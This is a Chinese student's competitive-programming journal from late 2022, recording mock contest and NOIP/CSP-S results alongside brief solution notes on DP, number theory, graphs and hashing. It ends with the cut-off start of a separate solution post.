都是简单的 $\\texttt{dp}$，但是还是有一定的细节。$\\texttt{F}$ 赛时来不及了，赛后补吧。 $\\texttt{2022.10.23}$再次模拟赛。今天的 $\\texttt{ABC}$ 都偏简单，$\\texttt{D}$ 赛时没想出来。简单说一下做法。 $\\texttt{A}$ 二维前缀和直接模拟即可。$\\texttt{B}$ 数学题，枚举前部分长度，然后通过乘法原理以及一定的分类讨论，留下合法情况就行，注意数据类型。$\\texttt{C}$ 枚举每种可能的颜色的区间，然后取交集，最后我是用差分进行维护的。$\\texttt{D}$ 赛时没想法，看数据范围猜测可能是树状数组（也有可能树状数组与逆序对的题目写多了的条件反射吧！）。 $\\texttt{2022.10.24}$停课了。 早上补题。$\\texttt{D}$ 终于有想法了，发现答案为 $n - \\texttt{最长连续不下降序列}$，但是只会 $O(n^2)$，将各个数字不重复的子任务相结合，写了个$O(n^2)$ 的暴力求解加上 $O(n)$ 的离散化后的 $\\texttt{dp}$，然后得了 $80$，之后就卡在处理重复数字的优化上了。题解好像是比较直接的处理了，将题目转化为最大化固定不动的数字，然后通过分类讨论向前还是向后移，求得答案。 终于有时间把那些压箱底的题目给补了，通过了很是开心！！！ $\\texttt{2022.10.25}$上午打一场 $\\texttt{CF}$ 的模拟赛（复现赛），编号是 $\\texttt{CF1736}$，$\\texttt{A B C1}$ 打的比较顺利，都一次过了， $\\texttt{C2}$ 没啥想法，猜测可能要数据结构维护。跳过先看了 $\\texttt{D}$，发现是一道构造题，并且只要输出一种可能解就行（并不要求最优），果断先写 $\\texttt{D}$，$15$ 分钟内过了。剩下的时间都在想 $\\texttt{C2}$，$\\texttt{E}$ 是 $\\texttt{dp}$ 不太想写。于是一直思考，最后实在想不出就开摆了。 切出 $4$ 题，大概在 $300-400$ 名左右吧，全靠 $\\texttt{D}$ 的分作贡献。 于是下午继续补 $\\texttt{CF}$ 和 $\\texttt{Atcoder}$ 的题目，……（省略一万字），就写到这吧。 为啥晚上还会有一套模拟赛，啥都不会，没交上去评测，真凉心。 $\\texttt{2022.10.26}$补了昨天 $\\texttt{CF}$ 剩下的两道题，$\\texttt{C2}$ 单独考虑每个数对答案的贡献，每个数最多扩展到的左端点为 $f_i = \\max (1,i - a_i + 1)$，而综合考虑，第 $i$ 个数能到的最左边的端点为 $p_i = \\max \\{f_j\\} (j \\le i)$，然后不修改时答案为 $\\sum_{i = 1}^{n} (i - (p - 1)) = \\dfrac{n(n + 1)}{2} + n - \\sum_{i = 1}^{n} p_i$。修改时用线段树维护即可，看着题解写的，还是有那么一点麻烦。 $\\texttt{E}$ 设 $dp_{i,j,k}$ 表示 第 $i$ 轮的位置为 $j$，交换次数为 $k$ 的最值，然后进行转移，细节就是注意转移的合法性和初始化。由于转移时要找之前的一段的最值，所以可以前缀和优化。同时，还可以用滚动数组优化空间，最后时间复杂度 $O(n^3)$，空间复杂度 $O(n^2)$。 晚上依旧模拟赛，终于可做。 $\\texttt{T1}$ 博弈论，类似 $\\texttt{Nim}$ 游戏，但是有上限，发现只要取个模就变为该游戏，所以对于上限 $x$，$\\texttt{Alice}$ 胜的充要条件为 $a_1 \\mod (x + 1) \\otimes a_2 \\mod (x + 1) \\otimes \\cdots \\otimes a_n \\mod (x + 1) 0$。于是直接模拟可以拿 $\\texttt{50 pts}$，但是后续并不会优化，先放着。 $\\texttt{T2}$ 数据结构毒瘤题。大鱼吃小鱼，判断能否使鱼的体积大于 $k$。依旧不太会做，只是知道尽量吃大一点的鱼的贪心思想，写了一个 set 模拟，不知道能拿几分。 $\\texttt{T3}$ 简单题，以最后答案的范围是 $[0,999]$ 为突破口，通过答案确定可能的区间。枚举 $x,y$，满足 $\\frac{x}{y}$ 已经是最简分数，然后计算可以同乘以的数的个数即可。 $\\texttt{T4}$ 像是一个数位 $\\texttt{dp}$，而且还需要高精度。直接准备拿 $n \\le 6$ 的暴力分以及 $m = 0$ 的点。由于懒得写高精度，于是用 python 打表，但是表过大屡次把编译器卡爆，所以最后就打了 $n \\le 100$ 的表，不晓得能拿多少。 交上去评测了（省略第一次测忘开 long long 的惨状），$50 + 30 + 100 + 50 = 230$，还可以叭，该拿的分都拿了（除了最后一题的神必高精度模拟）。 $\\texttt{2022.10.27}$上午复习数论。 重新推了一遍 $\\texttt{exgcd}$，怎么感觉这么陌生啊这这这…. 了解到一个叫做米勒罗宾素数测试的方法，本质是运用费马小定理的逆定理。 随机出几个数 $x$，若不满足 $x^{n - 1} \\equiv 1 (\\mod n)$，则可以说明 $n$ 是合数，计算概率可知，若重复 $p$ 次，均通过检测，则只有 $(\\frac{1}{2})^{p}$ 使它为合数，代码写起来很简单就不给了。 P1463 [POI2001][HAOI2007] 反素数 将数表示成算术基本定理的分解形式后，根据贪心，让小的质数的幂尽量大。不难发现，在该数据范围下，并不需要枚举过多的质数，直接搜索求解。 找出 $n$ 个数两两之间最大公约数的最大值。 倒序枚举最大的最大公约数，然后利用桶判断该公约数出现的次数，一旦大于等于 $2$ 次，则为一个合法解。由于倒序，此时最优，直接输出即可。由枚举方式可知，对于每个公约数 $d$，分别判断的是 $2d,3d \\cdots$ 是否存在，因此由调和级数知时间复杂度为 $O(n \\log n)$。 现在给定一个整数 $n$,需要找到一个大于 $n$ 整数 $m$，使得 $\\mathrm{LCM}(1,2,\\cdots,n) \\mid \\mathrm{LCM}(n + 1,n + 2,\\cdots,m)$。 按照算术基本定理的分解形式，发现 $m$ 满足 $a_i^{\\max{\\{p_i\\}}} \\mid m$，显然只要满足 $m$ 是其中一个最大的质数的幂次的 $2$ 倍即可。 求 $\\sum_{i = 1}^{n} \\gcd (i,n)$。 枚举最大公约数 $d$，设 $x = ad,n = bd(d \\mid n)$，则满足 $\\gcd (x,n) = d$ 时，当且仅当 $\\gcd (a,b) = 1$，也就是 $\\gcd (a,\\frac{n}{d}) = 1$，即两数互质，不难最大公约数为 $d$ 时符合条件的个数为 $\\varphi{(\\frac{n}{d})}$。所以最后的答案为 $\\sum_{d = 1}^{n} d \\times \\varphi{(\\frac{n}{d})}$。由于 $n \\in [1,10^9]$，所以计算 $\\varphi$ 时用 $O(\\sqrt n)$ 的复杂度计算即可，即 $\\varphi(n) = n(1 - \\frac{1}{p_1})(1 - \\frac{1}{p_2})\\cdots(1 - \\frac{1}{p_n})$ 的表达式。 Minimum Modular 由余数的定义可知，若 所有剩下的数 $\\mod M$ 均不同，显然最小的 $M \\in [n - k,\\max \\{a_i\\}]$，由数据范围可知我们可以枚举 $M$。发现当 $a_i$ 与 $a_j$ 同余时，$|a_i - a_j| \\mid M$，所以我们可以预处理差值，然后将 $M,2M,\\cdots,kM$ 的数全部进行统计，若在题目允许的修改范围内，那么我们就找到了最小的 $M$，输出即可。 已知若 $x,y \\in S$，则 $\\gcd (x,y) \\in S$。现在给出集合中一定存在的若干个数，需要求出集合的最小大小。 集合的最大数一定是所给中的最大值，于是我们又可以枚举每一个数，判断是否存在。对于一个输入中不包括的数 $x$，将所有已经存在于集合的 $kx$ 的 $k$ 进行 $\\gcd$ 运算，若最后的结果为 $1$，则说明最后能够得到 $x$，将其标记后加入答案即可。时间复杂度为调和级数以及外层的枚举，为 $O(n \\log n)$。 求 $\\sum_{i = 1}^{n} n \\bmod i$ 的值。 原式可以变为 $\\sum_{i = 1}^{n} n - \\lfloor \\dfrac{n}{i} \\rfloor \\times i = n^2 - \\sum_{i = 1}^{n} \\lfloor \\dfrac{n}{i} \\rfloor \\times i$。后者显然用整除分块加上等差数列求和维护即可，需要注意取模以及数据范围（$n$ 先取模后运算，否则会爆），时间复杂度为 $O(\\sqrt n)$。 $\\texttt{2022.10.28}$【插播广告】 今天是巨佬 $\\texttt{CENRUIYANG}$ 的生日，让我们一起祝他生日快乐。把这条消息转发到五个群，就能向他一样爆切 $\\texttt{IOI}$ 了（狗头。 重温一下最短路。 拆点是个很好的做法，相当于是将一个点拆成不同状态的多个点，然后分别连边进行建图。 【例】 求将任意仅一条边的边权除以二后的 $S$ 到 $T$ 的最短路（保证边权全部为偶数）。 每一条边都为除或不除两种状态，因此可以用 $[1,n]$ 表示未除过的点，$[n+1,2n]$ 表示除过的。连边时只有 $(x,y+n),(y,x+n)$ 时将边权除以 $2$，另外的 $(x,y),(y,x),(x + n,y + n),(y + n,x + n)$ 边权不变。最后跑一次为原图大小 $3$ 倍的最短路，然后输出 $dis_{t + n}$ 即可。 赛前再次看下模拟退火，为了骗分。 明天 $\\texttt{rp++}$ 吧！ $\\texttt{2022.10.29}$$\\texttt{CSP-S rp++!}$ 开考，$\\texttt{T1}$ 多次读错题目，好不容易写完后测了大样例突然发现写假了，这时候离开考已经过去了 $1.5h$，直接就慌了。 接下来先写了 $\\texttt{T2}$，满分似乎有些细节，于是果断去拿 $85\\texttt{pts}$。写完以后，感觉时间不大够了，便去写了 $\\texttt{T1,T3}$ 的部分分，$\\texttt{T4}$ 没来得及写。 感觉发挥不大好，但是却发现我只要一慌乱就不能再仔细去分析题目了，所以在 $\\texttt{NOIP}$ 之时一定要更加冷静一点。 估分： $(55-60)+85+(15-40)+0=155-185$，感觉不是卡线就是被线卡。 $\\texttt{2022.10.31}$补题。$\\texttt{T2}$ 写了八棵线段树，然后分类九类过了。 $\\texttt{T1}$ 借鉴了一下别人的思路，发现只要枚举 $b,c$ 或者 $a,d$，其它就可以贪心预处理，写了一个 $\\texttt{bfs}$ 过了。（为什么比赛的时候就大脑空白啊啊啊……） $\\texttt{T3}$ 直接判断每个点的出度是否为 $1$ 不就行了吗？当时怎么没有想到。然后利用 hash 来重置每个点的权值，当所有可以用的点的权值和和 $\\sum _{i = 1}^{n}w_i$ 相同时就可以判断合法了，这样复杂度就降到了 $O(q)$。 $\\texttt{2022.11.2}$写点数据结构题。 写点构造题。 $\\texttt{2022.11.3}$ GSS2 - Can you answer these queries II 求区间最大子段和（可为空），但是重复数字只算一次。不难想到离线处理，按询问的右端点进行排序。设当前的点为 $i$，则该数所产生的影响的区间为 $[pre_i + 1,i]$，因此在更新后求出历史区间和的最值（以之前的一点最多到 $i$ 点的最值）。 P6018 [Ynoi2010] Fusion tree $\\texttt{01 Tire}$ 的运用。对于每一个节点，开一个字典树。对于操作三，可以直接通过字典树求出子结点的异或和，由于只有一个父亲，直接单独处理即可。对于操作二，先删除再插入节点，同样的，对父亲单独进行处理，受到影响的是父亲的父亲节点。对于操作一，需要通过模拟可知，加一相当于在 $\\texttt{01 Trie}$ 中交换左右节点，因此直接递归求解即可。 P1318 积水面积 单调栈，当且仅当左右区域均比其大时会产生积水。可以直接正序倒序处理出两个数组表示从左/右开始的最大高度，然后遍历判断 $a_i$ 与最大高度的最小值的相对大小即可。 P4053 [JSOI2007] 建筑抢修 按时间排序后能加就加，不能加时若能够替换原有答案使得更优（也就是说当前修复时间比原有答案的最大值小时），则将其替换。可以使用优先队列或 multiset 实现。 $\\texttt{2022.11.6}$周末按道理是去教室自习，但是还是来到机房，还翘了数学考试。 上午瞎做了点题目，中午打饭的大伯给了两块肉还说这已经很多了？？？（真的气死） 下午模拟赛。（在机房打题真的会降智嘛，怎么打弱智错误？） $\\texttt{T1}$ 简单贪心，写完直接交。做 $\\texttt{T2}$ 的时候突然意识到 $\\texttt{T1}$ 的排序出锅了，于是赶紧改。 $\\texttt{T2}$ 简单数学题，发现要求 $n \\times m + (n - 1) \\times (m - 1) + (n - 2) \\times (m - 2) + \\cdots + (n - m + 1) \\times (m - (m - 1))$。直接拆括号，化简成 $nm^2 - \\dfrac{m(n + m)(m - 1)}{2} + \\dfrac{m(m - 1)(2m - 1)}{6}$。然后发现要高精，尝试 python，突然意识到要超时，然后又灵机一动写了个 __int128，直接水过。 然后跳过了 $\\texttt{T3}$ 写 $\\texttt{T4}$，降智开始了！想了很久就是想不出正解，于是打算骗 $\\texttt{69 pts}$，然而第二层 $\\texttt{dp}$ 写成了 for (int j = 1;j n;++j)，而应该是 for (int j = 1;j i;++j)。赛时连着对拍一起写挂了，所以没查出来，$\\texttt{69 pts} \\to \\texttt{21 pts}$。 最后写 $\\texttt{T3}$ 发现是个进制转换，然后无脑模拟。过了样例，提交后就开摆了。赛后发现爆灵，然后发现自己行末的 ; 竟然打成了 ,，也就是说条件语句不执行，答案也不会被更新，直接晕倒。更加神奇的是，$256$ 进制我乘的权值竟然是 $255$，再次晕倒。随便改了两下就过了。 于是，由于我的降智，$100 + 100 + 100 + 69 = 369 \\to 100 + 100 + 0 + 21 = 221$，真的是……无语住了。 继续写 $\\texttt{T4}$，尝试优化 $\\texttt{DP}$，考虑用优先队列，时间复杂度 $O(nm \\log n)$，加一个特判就可以拿到 $\\texttt{88 pts}$ 的好成绩。发现每层扫 $m$ 次实在有点浪费时间，由于要找到最值，于是将是否类型一样分别考虑然后去最大值，用线段树来优化 $\\texttt{DP}$，发现可做。写了一发就过嘞，开心！！！最后时间复杂度 $O(n \\log m)$。 $\\texttt{2022.11.8}$出分了！$\\texttt{CCF}$ 果然是脚造样例，不过应该还是拿二等奖（因为没写 $\\texttt{T4}$)。 实际分数：$\\texttt{60+85+60+0=205 pts}$。 $\\texttt{2022.11.9-11.11}$学校举行运动会加上艺术节，当然要去玩啦！ 老师在班上说，竞赛要学会取舍啥的，怎么感觉在讽刺我捏 $\\texttt{qwq}$。 $\\texttt{2022.11.12}$ P3957 [NOIP2017 普及组] 跳房子 单调队列优化 $\\texttt{dp}$。 Axel and Marston in Bitland dp[s][op][i][j] 表示以 $op$ 起始，$i \\to j$ 是否存在距离为 $2^s$ 的边，然后用 bitset 压位处理。 P4290 [HAOI2008] 玩具取名 区间 $\\texttt{dp}$，码量比较大，同时需要注意初始化。 P3049 [USACO12MAR]Landscaping S 普通线性 $\\texttt{dp}$，dp[i][j] 表示 $a$ 的前 $i$ 个与 $b$ 的前 $j$ 个相匹配的最小花费。 Name That Tune 期望 $\\texttt{dp}$，dp[i][j] 表示在听完前 $i$ 首歌花费 $j$ 秒的期望，然后用前缀和进行优化。 晚上打 $\\texttt{CF}$，快速切 $\\texttt{AB}$，$\\texttt{C}$ 题贪心的思路非常好想到，但是实现起来细节巨多，一直 $\\texttt{WA}$ 一直调，交了 $6$ 发才过，导致浪费了大量时间。用仅剩的 $30$ 分钟去写 $\\texttt{D}$，按位处理，然后调了一半就结束了，降大分。 $\\texttt{2022.11.13}$学校模拟赛，又一次凉心。 $\\texttt{T1}$ 搞了很久的 $\\texttt{dp}$，但是实现不出来，最后改写成暴力。 $\\texttt{T2}$ 贪心，写完测了大样例发现假了，实际上没看清题目中的一个限制，哎不管了，就先这样。 $\\texttt{T3}$ 直接模拟就可以有 $\\texttt{40 pts}$，仔细一想预处理每一行可以用倍增。一开始想要设第 $i$ 行从 $j$ 开始经过 $2^p$ 的距离所需的最小花费，由于贪心的思想，每次应该从 X 的格子开始计算花费，所以这样设并不好转移。想了一会儿，果断放弃。换一种设法，设 $f_{i,j,p}$ 表示第 $i$ 行从 $j$ 开始花费 $2^p$ 的代价能到达的最远距离，最远点设为 $m + 1$，于是就有 $f_{i,j,p} = f_{i,f_{i,j,p - 1},p - 1}$，于是时间复杂度就降到 $\\log$ 级别了。 $\\texttt{T4}$ 完全不会，暴力没时间打了。 $\\texttt{20 + 14 + 100 + 0 = 134 pts}$，第二题的假算法竟然还有分是我没想到的。 $\\texttt{2022.11.14}$麻麻生日。 $\\texttt{2022.11.15}$练习一些树上问题，包括贪心，数据结构和 $\\texttt{dp}$。 Distance to the Path 想了很久的数据结构题，感觉将问题拆分成子树内外进行考虑，是个很妙的做法。写了篇题解。 P2279 [HNOI2003]消防局的设立 $\\texttt{dp}$ 和贪心均可做，贪心好写一点，从深度大的节点开始，分别考虑每个节点的儿子节点与父节点。 P3942 将军令 上一题的加强版，大致依照之前的思路进行贪心即可。 P3523 [POI2011] DYN-Dynamite 和前两题相似贪心与 $\\texttt{dp}$ 相结合，不过由要使最大值最小可知需要二分。 P1084 [NOIP2012 提高组] 疫情控制 好想但不好写的树上贪心，外面还要套个二分。 P4281 [AHOI2008]紧急集合 / 聚会 三个点两两求 $\\texttt{LCA}$，然后去最优值。 P4092 [HEOI2016/TJOI2016]树 用树链剖分维护最大值，不过需要分清楚 $\\texttt{dfs}$ 的下标和实际的下标。似乎还有一个离线倒序处理的方式，可以少一个 $\\log$。 P4211 [LNOI2014]LCA 码量巨大的树链剖分题。离线处理所有询问，按端点排序后，用树链剖分与差分相结合。对于一个 $i$，将链 $1 \\to i$ 均增加一，查询时计算 $1 \\to z$ 的值即可。 Book of Evil 还是子树内外分开考虑的套路，$dp_{u,0/1}$ 表示以 $u$ 为根的子树内怪物与 $u$ 的最大/次大距离，$dp_{u,2}$ 表示 $u$ 到子树外怪物的最大距离，然后两次 $\\texttt{dfs}$ 进行转移。 Centroids 继续换根 $\\texttt{dp}$，设 $dp{u,0/1}$ 表示以 $u$ 为根子树内最大/次大的且不超过 $\\frac{n}{2}$ 的子树大小，$g_u$ 表示以 $u$ 为根的子树外最大的且不超过 $\\frac{n}{2}$ 的子树大小，然后和上一题差不多按套路转移即可。 $\\texttt{2022.11.17}$ Vitaly and Advanced Useless Algorithms 复习了一道关于 $0-1$ 背包的题目，细节有点多调了 $1h$，顺便水了一篇题解。 P5017 [NOIP2018 普及组] 摆渡车 再次写了这题，在题解的提示下用斜率优化写过这题目。 做点图论相关的题，顺便复习了下缩点。 P4568 [JLOI2011] 飞行路线 分层图的思想，也就是所谓的拆点。 P1462 通往奥格瑞玛的道路 二分后跑最短路，最大费用最小化就很套路。 P2783 有机化学之神偶尔会做作弊 边双连通分量缩点后求 $\\texttt{LCA}$，感觉也很套路，就当复习一下。 P1491 集合位置 P2865 [USACO06NOV]Roadblocks G 两题均和次短路有关，而下面的允许重复走一条边。因此前者每次删一条边后跑最短路，后者遍历枚举每一条未删的边计算 $dis1_u + dis2_v + val_i$ 的最小值。 Too Many Constraints 与 [ABC277Ex] Constrained Sums 都是 $\\texttt{2-SAT}$ 的题目，难点都在于将约束条件转换为连边，最后跑 tarjan 是套路。细节很多，调了整整一天。 官方分数线出了，被卡在 $\\texttt{2=}$ 的前几名（$\\texttt{ZJ-OIer}$ 之痛啊呜呜呜）。不过好在有前 $20\\%$（唯一能区分 $\\texttt{70 pts}$也能够 $\\texttt{2=}$ 的 $\\texttt{OIer}$ 了），晚上蓝勾到账，咕值排名上升到 $\\texttt{rk 49}$ 了，好耶！！！ $\\texttt{2022.11.18}$学一点之前一直没搞懂的期望 $\\texttt{dp}$。 FAVDICE - Favorite Dice 同 P1291 [SHOI2002] 百事世界杯之旅 再同 优惠券 Coupons 设 $f_i$ 表示已经扔了 $i$ 面后，还需仍的次数的期望。则 $f_i = \\dfrac{i}{n} \\times f_i + \\dfrac{n - i}{n}\\times f_{i + 1}$，即 $f_i = f_{i + 1} + \\dfrac{n}{n - i}$，再次转换知 $f_i = f_{i + 1} + \\dfrac{n}{i}$。 P4550 收集邮票 和上一题有些相似 $f_i = f_{i + 1} + \\dfrac{n - i}{i},g_i = \\dfrac{i}{n} \\times (f_i + g_i + 1) + \\dfrac{n - i}{n} \\times (f_{i + 1} + g_{i + 1} + 1) = g_{i + 1} + f_{i + 1} + \\dfrac{i}{n - i} \\times f_i + \\dfrac{n}{n - i}$，直接递推求解。 P2719 搞笑世界杯 $f_{i,j}$ 表示分别剩下 $i$ 与 $j$ 张时的票时，最后两张票相同的概率，则在 $i 1,j 1$ 时均为 $\\frac{1}{2}$ 的概率转移，注意边界条件的判断。 P3802 小魔女帕琪 $7$ 个一组进行分析且互不干扰，所以共有 $n - 6$ 组 $p = (n - 6) \\times E(x) = (n - 6) \\times \\dfrac{7! \\times a_1 \\times a_2 \\times \\cdots \\times a_7}{n \\times (n - 1) \\times \\cdots \\times(n - 6)}$，化简一下直接写就行了。 写一道有关矩阵乘法优化的 $\\texttt{dp}$。 P3176 [HAOI2015]数字串拆分 写了篇题解。 平衡树下周再看一下吧，希望别鸽。 $\\texttt{2022.11.19}$打洛谷的 $\\texttt{NOIP}$ 模拟赛。 第一题容易发现答案为 $2/3/4$，$2$ 非常容易判断，用二位前缀和处理 $3 / 4$ 的情况可以拿到 $\\texttt{80 pts}$（但是赛后证明数据过水，特判能直接过）。赛时又想到一个树状数组维护左上角和右下角的矩形的情况，由于折点不一定是整数，所以还要加一个二分判断。写了好久过了大样例，应该没啥问题。 第二题 $ty = 1$ 的点异常好做，直接计数 $\\texttt{dp}$，但是因为忘记取模调了好久。对于 $ty = 2$ 的没啥想法。 第三题，不会，直接写了暴力。 第四题，没啥想法，也是暴力。发现第二个子任务可做，但是觉得有点烦就没写。 最后得分 $100 + 50 + 30 + 8 = 188$，$\\texttt{rk 42}$，感觉还行（但是感觉难度偏高），第三题有 $\\texttt{30 pts}$ 真不错。 $\\texttt{2022.11.20}$校内模拟赛。 $\\texttt{T1}$ 排序。 【简要题意】 只能将排列从上往下 $k$ 层进行归并排序，其余只能单纯的合并，求能使其有序的排列数量。 最多只能递归到第 $k$ 层，所以二分处理，到达该层时的某段区间为 $[l,r]$，当前还有 $m$ 个数可以选，则这一段区间可以选的数量为 $C_m^{r - l + 1}$，处理完后剩下的数减少 $m$ 个。当然，需要处理未到第 $k$ 层时就出现 $l = r$ 的情况。所以说只需要去处理出组合数，然后就能递归求解，时间复杂度为 $O(n + tn)$。 $\\texttt{T2}$ 旅行。 【简要题意】 从一张单向图中选若干点，使得存在一条 $s \\to t \\to s$ 的路径且点权最小。 应该是 $\\texttt{dp}$，但是不知道如何处理来回经过重复点的情况。最后就写了一个最短路与状压来拿了 $n \\le 10$ 的部分分。 $\\texttt{T3}$ 教室。 【简要题意】 每一个点的权值为 $0/1$，状态为 $0/1/2/3$。状态为 $0$ 时表示权值一定为 $1$，状态为 $i(i \\in [1,3])$ 时表示点左侧相关的三个点（左/上/左上）至少有 $i$ 个点的权值为 $1$时该点的权值才有 $\\frac{1}{2}$ 的可能为 $1$。求所有点权和的期望值。 按顺序扫，对于每个点的情况容斥求解，当然也可以时分类去写期望值，写成了一个 $O(nm)$ 的程序，能过第一个样例，但是怎么都过不了第二个，一直没想通所以最后就没改了。 与巨佬 $\\texttt{CENRUIYANG}$ 讨论后总算知道问题出在哪里。每个点的计算不能简单的依赖左侧三点的概率，因为之前的点可能会导致某些 $1$ 不可能出现，总算明白正解为啥是复杂的状压加轮廓线 $\\texttt{dp}$ 了。 $\\texttt{hack}$ 数据，关注右下角的点。 2 30 1 13 3 1 $\\texttt{T4}$ 数树。 【简要题意】 设 $dis(x,y)$ 表示两点间的最短路径。给定一棵树，求互异三元组 $(a,b,c)$ 满足 $dis(a,b) \\le k,dis(a,c) \\le k,dis (b,c) \\le k$ 的个数。 一看就很复杂，写了个预处理 $LCA(x,y)$ 的 $O(n^3)$ 暴力和处理链的 $O(n^2)$ 就没有再多突破了。 最后得分：$100 + 40 + 30 + 50 = 220$，没有挂分这是好的，但是没写出 $\\texttt{T2}$ 这是糟的。 $\\texttt{2022.11.22}$信心赛，四道题后来都在洛谷上找到了。 P1161 开灯 易知 $x \\oplus y \\oplus y = x$，所以全部异或起来即可。 P1174 打砖块 $\\texttt{50 pts}$ 的 $\\texttt{dp}$ 十分好写，$dp_{i,j} = dp_{i - 1,j - s} + sum_{i,s}$，处理一个前缀和即可。这题就麻烦在遇到 Y 时只赚不亏，所以可以“借”子弹然后归还（然而前提是能够借到）。打的时候过了样例，但是测的时候发现还是写错了。 P1950 长方形 只要找到不重复统计的方式，然后直接单调栈优化即可（机房好像还有人写出了 $\\texttt{dp}$ 做法）。 P1462 通往奥格瑞玛的道路 前几天刚做过，直接二分加上最短路。 最后得分，$100 + 50 + 100 + 100 = 350$。 $\\texttt{2022.11.23}$考前最后一场模拟赛。 $\\texttt{T1 seg}$ 【简要题意】$n$ 个点总共组成 $\\frac{n(n + 1)}{2}$ 条线段（可能退化成点），线段可以存在或不存在，求有多少种线段存在的方案满足能够最大化选择 $k$ 条线段使其互不重叠。 基于贪心思想的计数 $\\texttt{dp}$。用 $dp_{i,j}$ 表示 $[1,i]$ 选择 $j$ 条线段，第 $j$ 线段的右端点选在 $i$ 的方案数。对于 $\\forall l \\in (p,i]$ 的所有线段，对右端点进行分类。若 $r \\in (i,n)$ 这些线段在之前已经被计算过，由于往后进行 $\\texttt{dp}$，不需要重复计算；有一条 $r = i$ 的可选线段的方案数为 $2 ^ {i - (p - 1) + 1} - 1 = 2 ^ {i - p} - 1$；$r \\in (i,n]$ 的线段，即使存在此时也不选择，方案数为 $2 ^ {(i - p) \\times (n - i)}$。预处理 $2$ 的幂次即可。 $\\texttt{T2 calc}$ 【简要题意】 求 $[1,n]$ 中不能被 $\\forall i \\in k,a_i$ 中整除的数的个数（$a_i$ 两两互质）。 写递推式，$f_{n,k} = f_{n,k - 1} + \\lfloor \\frac{n}{a_k} \\rfloor - f_{\\lfloor \\frac{n}{a_k} \\rfloor,k - 1}$。由数论分块可知，不同的下取整的数不会太多，所以直接写了记忆化。交上去时 $80$，看了题解发现大于某一个数时可以不被记忆化而直接被计算，所以可以用数组代替 map，节省空间与时间。 $\\texttt{T3 ball}$ 【简要题意】 给定一个长度为 $n$ 的 $01$ 串，进行区间 $0 \\to 1,1 \\to 0$ 的操作，每次操作保留，然后进行查询最长的 $00 \\cdots 011 \\cdots 1$ 的串的长度（可以没有 $0$ 或 $1$）。 线段树维护区间两个端点最长同色串的类型与长度，区间两个端点最长 $01$ 或 $10$ 串的长度，区间最长 $01$ 与 $10$ 串的长度。合并时处理完端点后考虑左右两个区间的中间部分的答案对整个区间产生的影响。区间进行翻转直接打标记即可，然后下传的同时改变串的类型，交换 $01$ 与 $10$ 串的答案即可。赛时没调出来，只交了一个暴力 $\\texttt{qwq}$。 $\\texttt{T4 array}$ 【简要题意】 构造数列 $A$，方法为：不断重复 $k$ 次将 $\\rm{Mex\\{A\\}}$ 插入 $A$ 末尾，然后将这 $k$ 个数的和插入 $A$ 末尾，以此类推。求 $n$ 的数列中的位置。 没想法，写了暴力。赛后看了题解还是不会，只知道是数学推式子题。 最后得分，$100 + 80 + 20 + 20 = 220$。 $\\texttt{2022.11.24}$做做 $\\texttt{NOIP 2020}$，并借题复习一下最后一块—字符串算法。 P7114 [NOIP2020] 字符串匹配 预处理前后缀出现奇数次的字符数量，然后枚举 $AB$，由于只有 $26$ 个字母，在判断 $C$ 时直接用树状数组求出符合条件的 $A$ 的个数，枚举 $AB$ 出现的次数采用了哈希。最后发现开 $O2$ 才能过，由于现在比赛自开 $O2$，所以就没事了。 P6739 [BalticOI 2014 Day1] Three Friends 哈希判重，唯一的坑点就是多解是指得到的 $S$ 不唯一而不是方式不唯一（可能多种方式均得到同一个 $S$）。 P3538 [POI2012]OKR-A Horrible Poem 若 $f(l,r - len) = f(l + len,r)$，则 $len$ 为一个可能的循环节，所以线性筛预处理每个数对应的最小素因子即可。 总结一下哈希（$hsh$ 表示哈希值，$pw$ 表示权值）： 从 $s$ 中截取 $s[l:r]$，哈希值为 $hsh_r - hsh_{l-1} \\times pw_{r - l + 1}$。 将 $1.$ 的计算方式编写为函数 $f(x,y)$，将 $s$ 中的 $s[sx:sy]$ 与 $s[fx:fy]$ 合并，哈希值为 $f (sx,sy) \\times pw_{fy - fx + 1} + f (fx,fy)$。 不要忘记 $pw_0 = 1$ 的初始化。 $\\texttt{2022.11.25}$练习骗分/调试小技巧。 打表 洛谷日报《浅谈打表与其技巧》。【注意 $\\texttt{CCF}$ 的代码长度上限是 $100KB$】 具有一般性的，通过分块打表来缩减表长，将搜索与表相结合，从而优化代码。 P2567 [SCOI2010]幸运数字 搜索出幸运数只有 $2000$ 个左右，因此可以通过这些幸运数进行打表，块长设置在 $2 \\times 10^6$ 较为合适。 P4318 完全平方数 $5 \\times 10^5$ 的表长加 $O2$ 终于过了。如果想要不吸氧并且在合理长度内，可以将表同减某一个数以缩小长度，最后加上即可。 对拍 防止 .bat 文件出错，写成在 Dev-C++ 内的形式。 #includewindows.husing namespace std;int main() while(1) system(data.exe); system(bf.exe); system(sol.exe); if (system(fc bf.out sol.out)) break; 模拟退火 重做了 P1433 吃奶酪 不过只拿到一半的分，不管了，会这个方法就行。 clock () - st 0.9 * CLOCKS_PER_SEC 卡时，注意前面单位是 毫秒，后面是秒。 应试技巧 看了看这篇博客。 好了，写完了，明天比赛加油吧！$\\texttt{rp++!}$ $\\texttt{2022.11.26}$要去打 $\\texttt{NOIP}$ 了。 $\\texttt{T1}$ 先写了 $76$，然后打算再次前缀和优化，但是一直错就放着了。然后开 $\\texttt{T2}$，想到了构造解法，一直尝试实现，但是实现不出来，此时时间仅剩 $\\texttt{1h}$。这时候整个人已经慌了，于是 $\\texttt{T3}$ 的 tarjan 写挂，只在最后一题拿了 $8$ 分。 预估 $76 + 0 + 0 + 8$，实测第二题的暴力也写错了，于是变成 $84 \\texttt{pts}$ 滚粗。 比赛开始前想的是写完第一题就去打暴力，但是实际却是死磕第二题，然后没时间写暴力。退役前的最后一场比赛算是完全得崩了。【要是当是努力调完 $\\texttt{T1}$，后面直接写部分分，那么 $100 + 30-50 + 35+ 8$ 并不是问题，估计也能拿个 $1=$ 了，现在连 $2=$ 都不保……】 【upd】 好叭，还有二等，距离一等就差在了写挂的 $\\texttt{T2 T3}$ 的暴力分上。 后记不断拼搏的 $\\texttt{OI}$ 生涯算是结束了，不知道高三这年会不会来玩玩。【结局：高三还是来玩并且圆梦 $\\texttt{1=}$】 一些小结写到语文随笔里了（不知道语文老师能不能接受我的“胡言乱语”），啥时候搬点过来。","categories":["Journal"]},{"title":"题解：P8509 如何得到 npy","path":"/2022/09/07/P8509/","content":"第一问很好求，相当于是所有点到 $s$ 或 $t$ 中较近的点的最短路径之和。换句话说，把 $s$ 与 $t$ 分别作为起点，跑两遍最短路后得到 $diss,dist$ 分别表示最短路，则答案即为 